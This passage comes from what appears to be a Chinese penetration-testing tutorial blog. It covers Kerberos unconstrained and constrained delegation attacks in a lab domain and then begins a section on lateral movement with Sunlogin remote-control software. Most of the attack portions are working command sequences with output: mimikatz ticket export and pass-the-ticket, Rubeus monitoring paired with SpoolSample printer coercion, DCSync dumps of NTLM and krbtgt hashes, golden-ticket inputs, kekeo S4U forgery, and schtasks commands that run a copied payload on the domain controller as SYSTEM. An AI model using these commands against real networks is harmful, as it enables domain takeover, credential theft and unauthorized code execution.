SQLServer,MYSQL等;域用户通过注册SPN也能成为服务账号。</strong></p><pre class="line-numbers language-none"><code class="language-none">net user test Admin@123 /add /domain 创建一个普通用户setspn -U -A priv/test test 注册为服务账号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/image-20230414181328037.png" alt="image-20230414181328037"></p><p><strong>开启委派如图</strong></p><p><img src="assets/image-20230414181455032.png" alt="image-20230414181455032"></p><h1 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h1><h2 id="非约束委派使用场景"><a href="#非约束委派使用场景" class="headerlink" title="非约束委派使用场景"></a>非约束委派使用场景</h2><p><strong>从使用的角度:用户张三访问一台机器A，于是向DC发起认证，DC会检查A的机器账号的属性，如果是非约束委<br>派的话，会把用户的TGT放在ST票据中并-起发送给A,这样A在验证ST票据的同时也获取到了用户的TGT,并把<br>TGT储存在自己的Isass进程中以备下次重用，从而A就可以使用这个TGT,来模拟这个张三访问任何服务。</strong></p><p><img src="assets/image-20230414182004604.png" alt="image-20230414182004604"></p><p><strong>从攻击角度来说:如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以<br>得到管理员的TGT,从而模拟管理员访问任意服务，相当于拿下了整个域环境，或者结合打印机漏洞让域管用户强<br>制回连以缓存TGT</strong></p><p><strong>一个域内用户访问WEB服务，但是一些资源在文件服务上， 这个时候就需要委派，需要web系统代表用户A去访<br>问文件服务的资源</strong></p><p><img src="assets/image-20230414175657946.png" alt="image-20230414175657946"></p><h2 id="非约束委派的漏洞"><a href="#非约束委派的漏洞" class="headerlink" title="非约束委派的漏洞"></a>非约束委派的漏洞</h2><p><img src="assets/image-20230414194133477-16814725001861.png" alt="image-20230414194133477"></p><p><strong>如果是域管访问web系统，我们就可以通过web系统伪造域管的身份登录域控</strong></p><h2 id="利用非约束委派域控主动访问控制域"><a href="#利用非约束委派域控主动访问控制域" class="headerlink" title="利用非约束委派域控主动访问控制域"></a>利用非约束委派域控主动访问控制域</h2><p><strong>实验环境如下:</strong></p><table><thead><tr><th>机器位置</th><th>机器IP</th><th>机器名</th><th>机器登录用户</th><th>所属域</th><th>委派配置</th></tr></thead><tbody><tr><td>域内域控制器</td><td>192.168.70.16</td><td>DC</td><td>hack\administrator</td><td>hack.com</td><td>域控</td></tr><tr><td>域内机器</td><td>192.168.70.14</td><td>PC-MB</td><td>hack\lihua</td><td>hack.com</td><td>配置了非约束委派</td></tr></tbody></table><p><strong>实验前提:控制了域内的一台机器pc-web,并且该机器的服务账号配置了非约束委派，如下:</strong></p><h3 id="1、使用Adfind查询"><a href="#1、使用Adfind查询" class="headerlink" title="1、使用Adfind查询"></a>1、使用Adfind查询</h3><h4 id="域内非约束委派机器账号"><a href="#域内非约束委派机器账号" class="headerlink" title="域内非约束委派机器账号"></a>域内非约束委派机器账号</h4><p>下载地址：<a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</a></p><pre class="line-numbers language-none"><code class="language-none">AdFind.exe -b "DC=hack,DC=com" -f "(&amp;(samAccountType=805306369) (userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230415190918597.png" alt="image-20230415190918597"></p><h4 id="查询具有委派的服务账号"><a href="#查询具有委派的服务账号" class="headerlink" title="查询具有委派的服务账号"></a>查询具有委派的服务账号</h4><pre class="line-numbers language-none"><code class="language-none">AdFind.exe -b "DC=hack,DC=com" -f "(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2、我们先去访问域控，是不能访问的"><a href="#2、我们先去访问域控，是不能访问的" class="headerlink" title="2、我们先去访问域控，是不能访问的"></a>2、我们先去访问域控，是不能访问的</h3><pre class="line-numbers language-none"><code class="language-none">dir \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3、这个时候如果域管访问了pc-web机器"><a href="#3、这个时候如果域管访问了pc-web机器" class="headerlink" title="3、这个时候如果域管访问了pc-web机器"></a>3、这个时候如果域管访问了pc-web机器</h3><p><strong>我们的内存中就会有域管的TGT,就可以访问任意机器了，在与域控上执行访问PC-MB(在域控上执行)</strong></p><pre class="line-numbers language-none"><code class="language-none">net use \\PC-MB.HACK.COM /user:hack\administrator 123456kl;'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4、去pc-mb导出内存中的票据"><a href="#4、去pc-mb导出内存中的票据" class="headerlink" title="4、去pc-mb导出内存中的票据"></a>4、去pc-mb导出内存中的票据</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz sekurlsa::tickets /export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5、进行票据传递就可以获取域控的权限了"><a href="#5、进行票据传递就可以获取域控的权限了" class="headerlink" title="5、进行票据传递就可以获取域控的权限了"></a>5、进行票据传递就可以获取域控的权限了</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz kerberos::ptt [0;14fd275]-2-0-60a10000-Administrator@krbtgt-HACK.COM.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6、访问域控"><a href="#6、访问域控" class="headerlink" title="6、访问域控"></a>6、访问域控</h3><pre class="line-numbers language-none"><code class="language-none">shell dir \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7、使用计划任务，服务-或者无文件的powershell上线"><a href="#7、使用计划任务，服务-或者无文件的powershell上线" class="headerlink" title="7、使用计划任务，服务,或者无文件的powershell上线"></a>7、使用计划任务，服务,或者无文件的powershell上线</h3><pre class="line-numbers language-none"><code class="language-none">shell copy 1.exe \\dc.hack.com\c$shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\1.exe /ru system /fshell schtasks /run /s dc.hack.com /i /tn "test"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="利用非约束委派域控被动访问控制域控"><a href="#利用非约束委派域控被动访问控制域控" class="headerlink" title="利用非约束委派域控被动访问控制域控"></a>利用非约束委派域控被动访问控制域控</h2><table><thead><tr><th>机器位置</th><th>机器IP</th><th>机器名</th><th>机器登录用户</th><th>所属域</th><th>委派配置</th></tr></thead><tbody><tr><td>域内域控制器</td><td>192.168.70.16</td><td>dc</td><td>hack\administrator</td><td>hack.com</td><td>域控</td></tr><tr><td>域内机器</td><td>192.168.70.14</td><td>pc-mb</td><td>hack\lihua</td><td>hack.com</td><td>配置了非约束委派</td></tr></tbody></table><p><strong>实验前提:控制了域内的一台机器OA,并且该机器的服务账号配置了非约束委派，如下:</strong></p><p>一般域管不会主动访问我们，我们可以利用**Windows打印系统远程协议(MS- RPRN)**中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification(Ex)</code>方法强制任何运行了Spooler服务的计算机以通过Kerberos或NTLM对攻击者选择的目标进行身份验证。非约束性委派主机结合Spooler打印机服务漏洞，让域控机器DC强制访问已控的具有本地管理员权限的非约束性委派机器OA，从而拿到域管理员的TGT,进而接管域控。(2008机器可能复现不了 ，因为版本的问题)</p><p><strong>进行实验之前一-定要把所有的防火墙关闭!所有的防火墙关闭!所有的防火墙关闭!</strong></p><h3 id="1、首先利用Rubeus"><a href="#1、首先利用Rubeus" class="headerlink" title="1、首先利用Rubeus"></a>1、首先利用Rubeus</h3><p>下载地址：<a href="https://codeload.github.com/shanfenglan/test/zip/refs/heads/master">https://codeload.github.com/shanfenglan/test/zip/refs/heads/master</a></p><p>在0A上以<strong>本地管理员权限</strong>执行以下命令,每隔一秒监听来自域控机器DC的登录信息</p><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe monitor /interval:1 /filteruser:DC$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2、再利用SpoolSample强制域控打印机回连"><a href="#2、再利用SpoolSample强制域控打印机回连" class="headerlink" title="2、再利用SpoolSample强制域控打印机回连"></a>2、再利用SpoolSample强制域控打印机回连</h3><p>需在<strong>域用户</strong>进程上执行，所以这里切换成了普通域用户帐号去执行</p><pre class="line-numbers language-none"><code class="language-none">SpoolSample.exe DC pc-mb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3、Rubeus监听票据"><a href="#3、Rubeus监听票据" class="headerlink" title="3、Rubeus监听票据"></a>3、Rubeus监听票据</h3><pre class="line-numbers language-none"><code class="language-none">doIFODCCBTSgAwIBBaEDAgEWooIETjCCBEphggRGMIIEQqADAgEFoQobCEhBQ0suQ09Noh0wG6ADAgECoRQwEhsGa3JidGd0GwhIQUNLLkNPTaOCBA4wggQKoAMCARKhAwIBAqKCA/wEggP4TphTWvbFIKyprPnEUM6qpyQIaF5dWb7VdcGY+/jHUlMjAEuUTCzHUx96YOkdDB1uhIzpAEy2YxqLLxtw5JudwQiPC7fAdKi9pLz3tL0BqkCeA4CZEkKP6ZeS0uFVBkZQYhkwYdlSE0tyv/URVkOKT5OJ+XZLkxjl7hCYXtdOFYEj1UiAQtI/cRTIAgLpJXuYHKUeuXwjL50BdOSc3Gvn7TsV1R/waVZXTTJ0pm63oySxeRBSx+Khiav+V+fEF9o6kyuxO0muIL0F9hWYdDjhclkYvMpx/dBJ7Dh0jY3DtQ5GhVneVwAIgFpINPU1rOWXEbGFyg8mjBI58CnI7c4f0l0uxumBSjG04io/S6YGpKnys6HycR2qKHt8QLjYxpByB++Ak4yTXSbqSL1SnHgpAl0/XtWqkZUzmoQob/ry049+tk5QYyj+vAHbs5hjk8EWcdCB2+0q9nC/rYq2G1z1lIXABZcPR2BWMuGZRGvBC6sVTCv6oo0gFmiGwzVh6J/ZyruwVacqjr+6K42F0vGoAU7BN3Ub7dTK8RSwiktdtikIScFglHy1gZCyipJZ+qJzGjsmA4RlItXPHV9ExHI/XjfMjwCHgLQc9NfWE0nQcXE9KONoeZRu+k0yU2HbTUqLpC1aapn2de5pQ4BX137N1uEVokYirpdHZh/XDja8QiVx9HfJClqRoL76S6UUuIiXqi5zrUZEOoZblarK32PBveGUboTR/KgNFYNJxa5neDtkIO+pynr0oz3O+nGmv4bFbQ76ZHwbv3mIoUpaA5WhpLEpicWdaxHFlf24QX7FoxRMTXXthQTP1D5yqIyh9CMH+un4yMupXIWcrlsE+Sk6+N0sYy0Ee2Xuf5HSLOa3s4hccDo5NiE+OAcihkcK6yGYh/qplw3WzWVsydOXrT26a9J0swmnT/3Bo+7mu+MW/UOo5QAKwiDe7utkL84cucmnId6XPufrjJoeuZN66p6ii0tKGx/Vmbi+dFlHIdzJoqZnCoDC8AFqBBZPLM1yn7A3mgIc3ZKVtHziK0NtenQ4rAnazS9IqO/0rXyLV9/WjVBKBDgNRB8w3fOLsXepwMJOYiEurDAMh/pAlOWPfXy34/MaXHZ6A+ED2wryTquG+/MKKfRgn31qDT1vym81hB4Tq0nv8ezqhmKCR0kD3Qg7rydTpS/jVpVpAfjhy+NgFlRnq/pOAxLf5v0H6qMp1n1AfV16sIcWv+ulSMdfqP0i556w5qs71b+LTHvnEABo5hIzSPrVdMUD2EuPjGqsii6RnUZLdxbNzuB3VP9rykykbP5bKUMEqPNJI07mQSEIg9sqB7fybPjPfkH7BZSQWJqWA9YOiWP5tA6jgdUwgdKgAwIBAKKBygSBx32BxDCBwaCBvjCBuzCBuKArMCmgAwIBEqEiBCBS2Pbn1k4vlrZNqzexWJjeHXlDnZ3VtIpJQhOcDz82RaEKGwhIQUNLLkNPTaIQMA6gAwIBAaEHMAUbA0RDJKMHAwUAYKEAAKURGA8yMDIzMDQxNTIyNDI1NFqmERgPMjAyMzA0MTYwODQyNTRapxEYDzIwMjMwNDIyMDM0MTM5WqgKGwhIQUNLLkNPTakdMBugAwIBAqEUMBIbBmtyYnRndBsISEFDSy5DT00=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4、Rubeus导入票据"><a href="#4、Rubeus导入票据" class="headerlink" title="4、Rubeus导入票据"></a>4、Rubeus导入票据</h3><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe ptt /ticket:票据eg:Rubeus.exe ptt /ticket:doIFODCCBTSgAwIBBaEDAgEWooIETjCCBEphggRGMIIEQqADAgEFoQobCEhBQ0suQ09Noh0wG6ADAgECoRQwEhsGa3JidGd0GwhIQUNLLkNPTaOCBA4wggQKoAMCARKhAwIBAqKCA/wEggP4TphTWvbFIKyprPnEUM6qpyQIaF5dWb7VdcGY+/jHUlMjAEuUTCzHUx96YOkdDB1uhIzpAEy2YxqLLxtw5JudwQiPC7fAdKi9pLz3tL0BqkCeA4CZEkKP6ZeS0uFVBkZQYhkwYdlSE0tyv/URVkOKT5OJ+XZLkxjl7hCYXtdOFYEj1UiAQtI/cRTIAgLpJXuYHKUeuXwjL50BdOSc3Gvn7TsV1R/waVZXTTJ0pm63oySxeRBSx+Khiav+V+fEF9o6kyuxO0muIL0F9hWYdDjhclkYvMpx/dBJ7Dh0jY3DtQ5GhVneVwAIgFpINPU1rOWXEbGFyg8mjBI58CnI7c4f0l0uxumBSjG04io/S6YGpKnys6HycR2qKHt8QLjYxpByB++Ak4yTXSbqSL1SnHgpAl0/XtWqkZUzmoQob/ry049+tk5QYyj+vAHbs5hjk8EWcdCB2+0q9nC/rYq2G1z1lIXABZcPR2BWMuGZRGvBC6sVTCv6oo0gFmiGwzVh6J/ZyruwVacqjr+6K42F0vGoAU7BN3Ub7dTK8RSwiktdtikIScFglHy1gZCyipJZ+qJzGjsmA4RlItXPHV9ExHI/XjfMjwCHgLQc9NfWE0nQcXE9KONoeZRu+k0yU2HbTUqLpC1aapn2de5pQ4BX137N1uEVokYirpdHZh/XDja8QiVx9HfJClqRoL76S6UUuIiXqi5zrUZEOoZblarK32PBveGUboTR/KgNFYNJxa5neDtkIO+pynr0oz3O+nGmv4bFbQ76ZHwbv3mIoUpaA5WhpLEpicWdaxHFlf24QX7FoxRMTXXthQTP1D5yqIyh9CMH+un4yMupXIWcrlsE+Sk6+N0sYy0Ee2Xuf5HSLOa3s4hccDo5NiE+OAcihkcK6yGYh/qplw3WzWVsydOXrT26a9J0swmnT/3Bo+7mu+MW/UOo5QAKwiDe7utkL84cucmnId6XPufrjJoeuZN66p6ii0tKGx/Vmbi+dFlHIdzJoqZnCoDC8AFqBBZPLM1yn7A3mgIc3ZKVtHziK0NtenQ4rAnazS9IqO/0rXyLV9/WjVBKBDgNRB8w3fOLsXepwMJOYiEurDAMh/pAlOWPfXy34/MaXHZ6A+ED2wryTquG+/MKKfRgn31qDT1vym81hB4Tq0nv8ezqhmKCR0kD3Qg7rydTpS/jVpVpAfjhy+NgFlRnq/pOAxLf5v0H6qMp1n1AfV16sIcWv+ulSMdfqP0i556w5qs71b+LTHvnEABo5hIzSPrVdMUD2EuPjGqsii6RnUZLdxbNzuB3VP9rykykbP5bKUMEqPNJI07mQSEIg9sqB7fybPjPfkH7BZSQWJqWA9YOiWP5tA6jgdUwgdKgAwIBAKKBygSBx32BxDCBwaCBvjCBuzCBuKArMCmgAwIBEqEiBCBS2Pbn1k4vlrZNqzexWJjeHXlDnZ3VtIpJQhOcDz82RaEKGwhIQUNLLkNPTaIQMA6gAwIBAaEHMAUbA0RDJKMHAwUAYKEAAKURGA8yMDIzMDQxNTIyNDI1NFqmERgPMjAyMzA0MTYwODQyNTRapxEYDzIwMjMwNDIyMDM0MTM5WqgKGwhIQUNLLkNPTakdMBugAwIBAqEUMBIbBmtyYnRndBsISEFDSy5DT00=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5、获取域内用户的hash"><a href="#5、获取域内用户的hash" class="headerlink" title="5、获取域内用户的hash"></a>5、获取域内用户的hash</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz lsadump::dcsync /all /csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">beacon&gt; mimikatz lsadump::dcsync /all /csv[*] Tasked beacon to run mimikatz's lsadump::dcsync /all /csv command[+] host called home, sent: 787057 bytes[+] received output:[DC] 'hack.com' will be the domain[DC] 'DC.hack.com' will be the DC server[DC] Exporting domain 'hack.com'[rpc] Service  : ldap[rpc] AuthnSvc : GSS_NEGOTIATE (9)502krbtgtd5adb4aa3a471374f46ba24ba01cb08b5141001DC1f0e20e21088dae3bfcfcf6d5f8bd98e5121118kkk579da618cfbfa85247acf1f800a280a45121119PC-GYX$009d1c712c2ec3f9b4344dce33b40c7340961002DC$5717ea7a3688384a618e60400cfdb35c5324801108jacke45a314c664d40a227f9540121d1a29d66048500Administratorf4766727c46a2891f71c237b518727d5660481121ABC$2888e20ad4fc91ca391f9f0e0cfe37e620801122WANLI$5956b201196858854f29b0503fef30e720801117PC-MB$40e3866bd78eb3bcfc9b137e111eee065283841120test570a9a65db8fba761c1008a51d4c95ab5248001113lihua68faaeedea6e05549453d18b03c6a8d266048<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>如果当前的用户是管理员就可以使用PTH攻击，如果是普通的域用户就使用黄金票据</strong></p><pre class="line-numbers language-none"><code class="language-none">502krbtgtd5adb4aa3a471374f46ba24ba01cb08b514500Administratorf4766727c46a2891f71c237b518727d566048<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="6、制作黄金票据"><a href="#6、制作黄金票据" class="headerlink" title="6、制作黄金票据"></a>6、制作黄金票据</h3><pre class="line-numbers language-none"><code class="language-none">查看域号：shell whoami /userdomain sid:S-1-5-21-3769107300-1842393386-2897162586用户名：administrtaordomain:hack.comdomain sid:S-1-5-21-3769107300-1842393386-2897162586krbtgt hash:d5adb4aa3a471374f46ba24ba01cb08b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/image-20230416114958275.png" alt="image-20230416114958275"></p><h3 id="7、使用计划任务，服务，或者无文件的powershell-上线"><a href="#7、使用计划任务，服务，或者无文件的powershell-上线" class="headerlink" title="7、使用计划任务，服务，或者无文件的powershell.上线"></a>7、使用计划任务，服务，或者无文件的powershell.上线</h3><pre class="line-numbers language-none"><code class="language-none">shell copy 1.exe \\dc.hack.com\C$shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\1.exe /ru system /fshell schtasks /run /s dc.hack.com /i /tn "test"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="约束性委派攻击"><a href="#约束性委派攻击" class="headerlink" title="约束性委派攻击"></a>约束性委派攻击</h1><h2 id="约束性委派场景"><a href="#约束性委派场景" class="headerlink" title="约束性委派场景"></a>约束性委派场景</h2><p>当这个<strong>用户不在域内</strong>，他在出差，不能使用kerberos去认证，只能使用其他协议认证web系统，那同样WEB系统<br>也需要访问文件服务的资源，这个时候如何认证呢?</p><p><img src="assets/image-20230416121039659.png" alt="image-20230416121039659"></p><p><strong>Widnows Server 2003之后微软引入了非约束委派。由于非约束委派的不安全性或者场景受限(配置了非约束<br>委派的机器在LSASS中缓存了用户的TGT票据可模拟用户去访问域中任意服务)，微软于2007年为Kerberos<br>协议进行扩展引入S4U(service for user)协议，该协议分为两个子协议</strong></p><ol><li>S4u2self (Service for User to Self)</li><li>S4U2proxy (Service for User to Proxy)</li></ol><p>这两个扩展都允许服务代表用户从KDC请求票证。</p><p>约束委派限制了S4U2proxy协议的请求范围，使得配置了委派属性的服务只能模拟用户身份访问特定的其他服务</p><p><img src="assets/image-20230416121602074.png" alt="image-20230416121602074"></p><h3 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h3><ol><li>服务账号B可以代表A申请访问B的票据，那么可不可以代表域管申请域管访问B的票据呢?在这个过程中，不需要域管参与，服务B自身就可以完成</li><li>服务账号B可以代表A申请访问C的票据，那么可不可以代表域管申请域管访问C的票据呢?在这个过程中，不需要域管参与，服务B自身就可以完成</li></ol><h2 id="约束性委派攻击流程"><a href="#约束性委派攻击流程" class="headerlink" title="约束性委派攻击流程"></a>约束性委派攻击流程</h2><p>用户(A)访问WEB系统(B) ,B代表A去向KDC申请访问B的TGT和ST1 (使用S4u2self),用户A拿到了ST1就可以访问B了，如果在B上配置了约束性委派(A到C的约束委派)，则B能够使用S4U2Proxy协议将用户发给自己的可转发的ST1票据以用户的身份发给KDC,KDC返回B-个访问C的票据ST2,这样B就可以以用户的身份访问C</p><p><img src="assets/image-20230416135234253.png" alt="image-20230416135234253"></p><pre class="line-numbers language-none"><code class="language-none">1.通过NTLM或者其他认证2.B代表A申请A访问B的票据(TGT和ST1)3.KDC返回用户的TGT和ST1票据给B4.B把ST1票据给A5.A用ST1去访问B6.B拿着A的ST1作为证据，去申请访问C的ST27.B用ST2票据访问C<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="存在的问题是什么呢"><a href="#存在的问题是什么呢" class="headerlink" title="存在的问题是什么呢?"></a>存在的问题是什么呢?</h3><p><strong>只要我们伪造了A的TGT,就可以向KDC申请一张ST1, 有了ST1之后，就可以拿着ST1作为证据，向KDC申请访问<br>文件服务的票据ST2|</strong></p><h2 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h2><table><thead><tr><th>机器位置</th><th>机器IP</th><th>机器名</th><th>机器登录用户</th><th>所属域</th><th>委派配置</th></tr></thead><tbody><tr><td>域内域控制器</td><td>192.168.70.16</td><td>dc</td><td>hack\administrator</td><td>hack.com</td><td>域控</td></tr><tr><td>域内机器</td><td>192.168.70.14</td><td>pc-mb</td><td>hack\lihua</td><td>hack.com</td><td>配置了约束委派</td></tr></tbody></table><p><strong>实验前提:我们已经控制了pc-mb的电脑，发现该电脑配置了约束性的委派，并且可以读取到该电脑的机器用户的HASH值</strong></p><h3 id="1-查询约束性委派的机器和服务"><a href="#1-查询约束性委派的机器和服务" class="headerlink" title="1.查询约束性委派的机器和服务"></a>1.查询约束性委派的机器和服务</h3><pre class="line-numbers language-none"><code class="language-none">查询约束委派机器账户AdFind.exe -b "DC=hack,DC=com" -f "(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto查询约束委派服务账户AdFind.exe -b "DC=hack,DC=com" -f "(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))" cndistinguishedName msds-allowedtodelegateto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><pre class="line-numbers language-none"><code class="language-none">AdFind V01.57.00cpp Joe Richards (support@joeware.net) November 2021Using server: DC.hack.com:389Directory: Windows Server 2012 R2dn:CN=PC-MB,CN=Computers,DC=hack,DC=com&gt;msDS-AllowedToDelegateTo: cifs/DC&gt;msDS-AllowedToDelegateTo: cifs/DC.hack.com/HACK&gt;msDS-AllowedToDelegateTo: cifs/DC/HACK&gt;msDS-AllowedToDelegateTo: cifs/DC.hack.com/hack.com&gt;msDS-AllowedToDelegateTo: cifs/DC.hack.com&gt;msDS-AllowedToDelegateTo: cifs/pc-gyx.hack.com&gt;msDS-AllowedToDelegateTo: cifs/PC-GYX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>查询到PC-MB电脑配置了约束委派，委派的目标是DC的CIFS服务</strong></p><h3 id="2、使用mimikatz获取机器账户NTLM-Hash"><a href="#2、使用mimikatz获取机器账户NTLM-Hash" class="headerlink" title="2、使用mimikatz获取机器账户NTLM Hash"></a>2、使用mimikatz获取机器账户NTLM Hash</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h4><pre class="line-numbers language-none"><code class="language-none">* Username : PC-MB$ * Domain   : HACK * NTLM     : 40e3866bd78eb3bcfc9b137e111eee06 * SHA1     : 44aa776091c4404d10f838dd00e7273fdcada588<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、使用kekeo申请配置了约束委派机器账户PC-ZS-的TGT"><a href="#3、使用kekeo申请配置了约束委派机器账户PC-ZS-的TGT" class="headerlink" title="3、使用kekeo申请配置了约束委派机器账户PC-ZS$的TGT"></a>3、使用kekeo申请配置了约束委派机器账户PC-ZS$的TGT</h3><p>下载地址：<a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><pre class="line-numbers language-none"><code class="language-none">kekeo "tgt::ask /user:PC-MB$ /NTLM:40e3866bd78eb3bcfc9b137e111eee06 /domain:hack.com" "exit"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成一张tgt<code>TGT_PC-MB$@HACK.COM_krbtgt~hack.com@HACK.COM.kirbi</code></p><h3 id="4、利用TGT通过伪造S4U请求以administrator身份访问PC-ZS的ST"><a href="#4、利用TGT通过伪造S4U请求以administrator身份访问PC-ZS的ST" class="headerlink" title="4、利用TGT通过伪造S4U请求以administrator身份访问PC-ZS的ST"></a>4、利用TGT通过伪造S4U请求以administrator身份访问PC-ZS的ST</h3><pre class="line-numbers language-none"><code class="language-none">kekeo "tgs::s4u /tgt:TGT_PC-MB$@HACK.COM_krbtgt~hack.com@HACK.COM.kirbi /user:Administrator@hack.com /service:cifs/dc.hack.com" "exit"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="生成一张st1和一张st2"><a href="#生成一张st1和一张st2" class="headerlink" title="生成一张st1和一张st2"></a>生成一张st1和一张st2</h4><pre class="line-numbers language-none"><code class="language-none">TGS_Administrator@hack.com@HACK.COM_PC-MB$@HACK.COM.kirbiTGS_Administrator@hack.com@HACK.COM_cifs~dc.hack.com@HACK.COM.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="5、mimkatz注入"><a href="#5、mimkatz注入" class="headerlink" title="5、mimkatz注入"></a>5、mimkatz注入</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz kerberos::ptt TGS_Administrator@hack.com@HACK.COM_cifs~dc.hack.com@HACK.COM.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6、访问域控-1"><a href="#6、访问域控-1" class="headerlink" title="6、访问域控"></a>6、访问域控</h3><pre class="line-numbers language-none"><code class="language-none">shell dir \\dc.hack.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/29-nei-wang-shen-tou/di-4-zhang-heng-xiang-yi-dong/di-4-zhang-heng-xiang-yi-dong/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/29-nei-wang-shen-tou/di-4-zhang-heng-xiang-yi-dong/di-4-zhang-heng-xiang-yi-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="利用远控工具向日葵横向移动"><a href="#利用远控工具向日葵横向移动" class="headerlink" title="利用远控工具向日葵横向移动"></a>利用远控工具向日葵横向移动</h1><h2 id="向日葵介绍"><a href="#向日葵介绍" class="headerlink" title="向日葵介绍"></a>向日葵介绍</h2><p>向日葵远程控制软件是一款免费的集远程控制电脑/手机/平板、远程桌面连接、远程开机、远程管理、支持内网穿 透的一体化远程控制管理工具软件，且还能进行远程文件传输、远程摄像头监控等。 </p><p>支持系统：Winodws/Linux/MacOS/Android/iOS</p><h2 id="向日葵远控连接"><a href="#向日葵远控连接" class="headerlink" title="向日葵远控连接"></a>向日葵远控连接</h2><h3 id="向日葵-免安装-的时候第一次会进入选择界面"><a href="#向日葵-免安装-的时候第一次会进入选择界面" class="headerlink" title="向日葵 免安装 的时候第一次会进入选择界面"></a>向日葵 免安装 的时候第一次会进入选择界面</h3><p><img src="assets/image-20230306151352018.png" alt="image-20230306151352018"></p><h3 id="使用提前注册-注册表-的方式进行绕过弹窗"><a href="#使用提前注册-注册表-的方式进行绕过弹窗" class="headerlink" title="使用提前注册 注册表 的方式进行绕过弹窗"></a>使用提前注册 注册表 的方式进行绕过弹窗</h3><h4 id="注册表文件如下"><a href="#注册表文件如下" class="headerlink" title="注册表文件如下"></a>注册表文件如下</h4><pre class="line-numbers language-none"><code class="language-none">Windows Registry Editor Version 5.00[HKEY_CURRENT_USER\SOFTWARE\Oray\SunLogin\SunloginClient]"11.1.0.37237_IsRunSeted"="1"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="将以上的代码保存为，xxx-reg-如（1-reg）"><a href="#将以上的代码保存为，xxx-reg-如（1-reg）" class="headerlink" title="将以上的代码保存为，xxx.reg 如（1.reg）"></a>将以上的代码保存为，xxx.reg 如（1.reg）</h4><p><img src="assets/image-20230306151425503.png" alt="image-20230306151425503"></p><h3 id="将文件传到目标服务器"><a href="#将文件传到目标服务器" class="headerlink" title="将文件传到目标服务器"></a>将文件传到目标服务器</h3><p><img src="assets/image-20230306151446436.png" alt="image-20230306151446436"></p><h3 id="运行注册注册表的命令和运行向日葵"><a href="#运行注册注册表的命令和运行向日葵" 